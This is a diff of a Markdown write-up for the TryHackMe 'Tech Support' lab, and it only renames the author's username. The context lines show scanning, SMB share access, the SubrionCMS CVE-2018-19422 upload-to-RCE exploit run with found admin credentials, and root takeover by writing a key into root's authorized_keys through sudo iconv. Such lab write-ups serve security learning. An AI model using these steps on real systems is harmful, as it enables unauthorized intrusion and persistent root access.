@@ -16,7 +16,7 @@ Please allow about 5 minutes for the machine to fully boot!
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
 └─$ rustscan -a 10.10.1.80 -- -A   
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -29,7 +29,7 @@ ________________________________________
  --------------------------------------
 TreadStone was here 🚀
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.1.80:22
@@ -111,7 +111,7 @@ Nmap done: 1 IP address (1 host up) scanned in 46.97 seconds
 We search for hidden directories with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.1.80/   
 
 /.hta                 (Status: 403) [Size: 275]
@@ -147,7 +147,7 @@ http://10.0.2.15/wordpress/wp-admin/
 We can use [Enum4linux](../../3%20-%20Tags/Hacking%20Tools/Enum4linux.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
 └─$ enum4linux  -a 10.10.1.80
 
 [+] Got OS info for 10.10.1.80 from srvinfo:                                                                                                                                                                                                 
@@ -200,9 +200,9 @@ We get a user : **scamsite**, and we get shares.
 We can use [SMBclient](../../3%20-%20Tags/Hacking%20Tools/SMBclient.md) to see if we can read some files on the shares :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
 └─$ smbclient \\\\10.10.1.80\\websvr
-Password for [WORKGROUP\hax]:
+Password for [WORKGROUP\mdn0x]:
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                   D        0  Sat May 29 09:17:38 2021
@@ -222,7 +222,7 @@ getting file \enter.txt of size 273 as enter.txt (0,2 KiloBytes/sec) (average 0,
 And we read the enter.txt file :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
 └─$ cat enter.txt 
 GOALS
 =====
@@ -306,7 +306,7 @@ I can't have a meterpreter shell idk why don't work.
 We will use [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) to search for the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) and use it :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
 └─$ python3 49876.py -h
 Usage: 49876.py [options]
 
@@ -317,7 +317,7 @@ Options:
   -p PASSW, --passw=PASSW
                         Password credential to login
                                                                                                                
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
 └─$ python3 49876.py -u http://10.10.1.80/subrion/panel/ -l admin -p Scam2021
 [+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
 
@@ -417,18 +417,18 @@ To achieve this we can generate a keypair on our machine and exploit our ability
 We can use [SSH-KeyGen](../../3%20-%20Tags/Hacking%20Tools/SSH-KeyGen.md) to generate the key,then write it to our victim via iconv, and access [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) from our machine as root users :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
 └─$ ssh-keygen             
 Generating public/private ed25519 key pair.
-Enter file in which to save the key (/home/hax/.ssh/id_ed25519): 
-/home/hax/.ssh/id_ed25519 already exists.
+Enter file in which to save the key (/home/mdn0x/.ssh/id_ed25519): 
+/home/mdn0x/.ssh/id_ed25519 already exists.
 Overwrite (y/n)? y
-Enter passphrase for "/home/hax/.ssh/id_ed25519" (empty for no passphrase): 
+Enter passphrase for "/home/mdn0x/.ssh/id_ed25519" (empty for no passphrase): 
 Enter same passphrase again: 
-Your identification has been saved in /home/hax/.ssh/id_ed25519
-Your public key has been saved in /home/hax/.ssh/id_ed25519.pub
+Your identification has been saved in /home/mdn0x/.ssh/id_ed25519
+Your public key has been saved in /home/mdn0x/.ssh/id_ed25519.pub
 The key fingerprint is:
-SHA256:6n1u9ZUAmxsgf/uMiJkrxQSFgIGsy50tC4ZqAGfQkHA hax@HaxonKali
+SHA256:6n1u9ZUAmxsgf/uMiJkrxQSFgIGsy50tC4ZqAGfQkHA mdn0x@mdn0xonKali
 The key's randomart image is:
 +--[ED25519 256]--+
 |*=E.. o.         |
@@ -442,15 +442,15 @@ The key's randomart image is:
 |.     o.o+.      |
 +----[SHA256]-----+
                                                                                                                                        
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
-└─$ cat /home/hax/.ssh/id_ed25519.pub 
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg hax@HaxonKali
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Tech_Support1]
+└─$ cat /home/mdn0x/.ssh/id_ed25519.pub 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali
 ```
 
 Now we copy our **public** key it on our target in the auth keys file :
 
 ```
-scamsite@TechSupport:/dev/shm$ echo "ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg hax@HaxonKali
+scamsite@TechSupport:/dev/shm$ echo "ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali
 " | sudo iconv -f 8859_1 -t 8859_1 -o "/root/.ssh/authorized_keys"
 ```
 
@@ -459,6 +459,6 @@ scamsite@TechSupport:/dev/shm$ echo "ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rG
 Now we access with the **private** key :
 
 ```
-ssh -i /home/hax/.ssh/id_ed25519 root@10.10.1.80
+ssh -i /home/mdn0x/.ssh/id_ed25519 root@10.10.1.80
 ```
 
